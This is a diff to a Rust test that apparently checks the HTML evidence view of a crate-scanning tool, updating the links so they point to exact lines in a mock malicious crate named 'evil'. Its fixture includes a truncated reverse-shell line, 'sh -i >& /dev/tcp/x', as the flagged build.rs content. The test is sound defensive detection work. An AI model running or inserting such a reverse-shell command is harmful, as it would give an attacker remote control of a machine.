@@ -675,12 +675,13 @@ async fn static_evidence_shows_the_code_around_it() {
         [" 8 // a", ">9 sh -i >& /dev/tcp/x"]
     );
     let viewer = "https://crates.io/crates/evil/0.1.0/code/build.rs";
-    assert_eq!(
-        evidence.matches(&format!("<a href=\"{viewer}\"")).count(),
-        2
-    );
+    assert!(evidence.contains(&format!("<a href=\"{viewer}#L3\"")));
+    // The old verdict names only the file; the finding knows the line.
+    assert!(evidence.contains(&format!("<a href=\"{viewer}#L9\"")));
     let findings = &html[html.find("<h2>Static findings</h2>").unwrap()..];
-    assert!(findings.contains("<a href=\"https://crates.io/crates/evil/0.1.0/code/src/lib.rs\""));
+    assert!(
+        findings.contains("<a href=\"https://crates.io/crates/evil/0.1.0/code/src/lib.rs#L3\"")
+    );
     assert_eq!(findings.matches("<details>").count(), 2);
     assert_eq!(snippet(findings, "<details>").len(), 4);
     db.drop().await;
